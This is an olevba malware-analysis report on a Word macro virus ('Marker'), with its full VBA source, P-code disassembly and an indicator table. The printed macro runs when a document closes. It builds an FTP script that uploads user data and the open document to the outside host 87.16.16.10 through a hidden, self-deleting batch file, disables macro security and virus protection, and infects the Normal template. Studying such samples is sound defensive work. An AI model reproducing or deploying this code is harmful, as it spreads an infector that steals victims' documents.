olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.js
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.js - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const EXELoc = "Template"
'Ver=2.02
Private Sub Document_Close()

On Error Resume Next

Const InfectedMark = "±¾²úÆ·ÎªÁ¼ÐÔ"
Const Ver = "2.01"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String
Dim BegSlash, EndSlash, Loc As Long
Dim FileDosPath As String

Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(InfectedMark, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(InfectedMark, 1, 1, 10000, 10000)

If (EXELoc <> "Template") Or Not (DocumentInfected) Then
  LogData = Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & _
              "' " & Application.UserName & _
              "' " & UserAddress & "' " & ThisDocument.Name
    
    For i = 1 To 4
        LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\Log" & LogFile
   
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1

    BegSlash = 1
    EndSlash = 1
    FileDosPath = ActiveDocument.Path + "\"
    Do While EndSlash > 0
       BegSlash = InStr(BegSlash, FileDosPath, "\")
       EndSlash = InStr(BegSlash + 1, FileDosPath, "\")
       FileDosPath = Mid(FileDosPath, 1, BegSlash) + """" + Mid(FileDosPath, BegSlash + 1, EndSlash - BegSlash - 1) + _
                 """" + Mid(FileDosPath, EndSlash)
       BegSlash = EndSlash + 2
    Loop

    Open "c:\Log" For Output As #1
    Print #1, "o 87.16.16.10"
    Print #1, "user centre centre"
    Print #1, "cd /usr/news"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "binary"
    Print #1, "put " & FileDosPath & ActiveDocument.Name
    Print #1, "del " & LogFile
    Print #1, "del c:\Log "
    Print #1, "quit"
    Close #1
    
    Open "c:\DelBat.bat" For Output As #1
    Print #1, "call ftp.exe -n -s:c:\Log"
    Print #1, "del " & LogFile
    Print #1, "del c:\Log"
    Print #1, "del c:\DelBat.bat"
    Close #1
    Shell "command.com /c c:\DelBat.bat", vbHide
End If
If DocumentInfected Then
   If IsNumeric(Mid(ad.codemodule.Lines(2, 1), 6)) Then
      DocumentInfected = (Val(Mid(ad.codemodule.Lines(2, 1), 6)) >= Ver)
   Else
      DocumentInfected = False
   End If
End If

If NormalTemplateInfected Then
   If IsNumeric(Mid(nt.codemodule.Lines(2, 1), 6)) Then
      NormalTemplateInfected = (Val(Mid(nt.codemodule.Lines(2, 1), 6)) >= Ver)
   End If
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  CommandBars("¹¤¾ß").Controls("ºê").Enabled = False
  Options.ConfirmConversions = False
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Options.SavePropertiesPrompt = False
End If

If (DocumentInfected = False Or NormalTemplateInfected = False) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = "const EXELoc=" + """" + "Template" + """" + Chr(13)
    OurCode = OurCode + ad.codemodule.Lines(2, ad.codemodule.CountOfLines - 1)

    nt.codemodule.DeleteLines 1, nt.codemodule.CountOfLines
    nt.codemodule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
  End If

  If NormalTemplateInfected = True Then
  
    SaveDocument = ActiveDocument.Saved
    OurCode = "const EXELoc=" + """" + "Document" + """" + Chr(13)
    OurCode = OurCode + nt.codemodule.Lines(2, nt.codemodule.CountOfLines - 1)

    ad.codemodule.DeleteLines 1, ad.codemodule.CountOfLines
    ad.codemodule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
  End If
    
End If
End Sub






























































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.js
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8394 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x0008 "Template"
' 	VarDefn EXELoc
' Line #1:
' 	QuoteRem 0x0000 0x0008 "Ver=2.02"
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000C "±¾²úÆ·ÎªÁ¼ÐÔ"
' 	VarDefn InfectedMark
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x0004 "2.01"
' 	VarDefn Ver
' Line #8:
' Line #9:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #11:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' 	Dim 
' 	VarDefn BegSlash
' 	VarDefn EndSlash
' 	VarDefn Loc (As Long)
' Line #13:
' 	Dim 
' 	VarDefn FileDosPath (As String)
' Line #14:
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #17:
' Line #18:
' 	Ld InfectedMark 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #19:
' 	Ld InfectedMark 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #20:
' Line #21:
' 	Ld EXELoc 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	Paren 
' 	Ld DocumentInfected 
' 	Paren 
' 	Not 
' 	Or 
' 	IfBlock 
' Line #22:
' 	LineCont 0x000C 09 00 15 00 10 00 0E 00 16 00 0E 00
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Concat 
' 	St LogData 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #25:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	LitStr 0x0006 "C:\Log"
' 	Ld LogFile 
' 	Concat 
' 	St LogFile 
' Line #28:
' Line #29:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #32:
' Line #33:
' 	LitDI2 0x0001 
' 	St BegSlash 
' Line #34:
' 	LitDI2 0x0001 
' 	St EndSlash 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St FileDosPath 
' Line #36:
' 	Ld EndSlash 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #37:
' 	Ld BegSlash 
' 	Ld FileDosPath 
' 	LitStr 0x0001 "\"
' 	FnInStr3 
' 	St BegSlash 
' Line #38:
' 	Ld BegSlash 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld FileDosPath 
' 	LitStr 0x0001 "\"
' 	FnInStr3 
' 	St EndSlash 
' Line #39:
' 	LineCont 0x0004 1C 00 11 00
' 	Ld FileDosPath 
' 	LitDI2 0x0001 
' 	Ld BegSlash 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 """
' 	Add 
' 	Ld FileDosPath 
' 	Ld BegSlash 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld EndSlash 
' 	Ld BegSlash 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	Ld FileDosPath 
' 	Ld EndSlash 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	St FileDosPath 
' Line #40:
' 	Ld EndSlash 
' 	LitDI2 0x0002 
' 	Add 
' 	St BegSlash 
' Line #41:
' 	Loop 
' Line #42:
' Line #43:
' 	LitStr 0x0006 "c:\Log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "o 87.16.16.10"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "user centre centre"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "cd /usr/news"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld FileDosPath 
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del c:\Log "
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' Line #56:
' 	LitStr 0x000D "c:\DelBat.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "call ftp.exe -n -s:c:\Log"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "del c:\Log"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "del c:\DelBat.bat"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #62:
' 	LitStr 0x001C "command.com /c c:\DelBat.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld DocumentInfected 
' 	IfBlock 
' Line #65:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0002 
' 	ArgsLd IsNumeric 0x0001 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld Ver 
' 	Ge 
' 	Paren 
' 	St DocumentInfected 
' Line #67:
' 	ElseBlock 
' Line #68:
' 	LitVarSpecial (False)
' 	St DocumentInfected 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	Ld NormalTemplateInfected 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0002 
' 	ArgsLd IsNumeric 0x0001 
' 	IfBlock 
' Line #74:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld Ver 
' 	Ge 
' 	Paren 
' 	St NormalTemplateInfected 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #78:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #79:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #80:
' 	ElseBlock 
' Line #81:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #82:
' 	LitVarSpecial (False)
' 	LitStr 0x0002 "ºê"
' 	LitStr 0x0004 "¹¤¾ß"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #87:
' 	EndIfBlock 
' Line #88:
' Line #89:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #90:
' Line #91:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #92:
' Line #93:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #94:
' Line #95:
' 	LitStr 0x000D "const EXELoc="
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x0008 "Template"
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St OurCode 
' Line #96:
' 	Ld OurCode 
' 	LitDI2 0x0002 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	St OurCode 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #99:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #100:
' Line #101:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #102:
' 	EndIfBlock 
' Line #103:
' Line #104:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #105:
' Line #106:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #107:
' 	LitStr 0x000D "const EXELoc="
' 	LitStr 0x0001 """
' 	Add 
' 	LitStr 0x0008 "Document"
' 	Add 
' 	LitStr 0x0001 """
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St OurCode 
' Line #108:
' 	Ld OurCode 
' 	LitDI2 0x0002 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	St OurCode 
' Line #109:
' Line #110:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #111:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #112:
' Line #113:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #114:
' 	EndIfBlock 
' Line #115:
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |87.16.16.10         |IPv4 address                                 |
|IOC       |DelBat.bat          |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |Marker.js           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

